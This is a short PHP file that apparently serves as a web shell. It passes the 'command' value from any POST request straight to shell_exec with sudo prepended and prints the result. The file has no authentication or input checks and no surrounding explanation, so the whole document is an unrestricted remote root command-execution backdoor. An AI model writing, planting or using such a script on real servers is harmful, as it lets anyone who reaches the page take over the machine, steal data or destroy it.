<?php

$command = $_POST['command'];

$result = shell_exec('sudo ' . $command);
echo ('<pre>' . $result . '</pre>');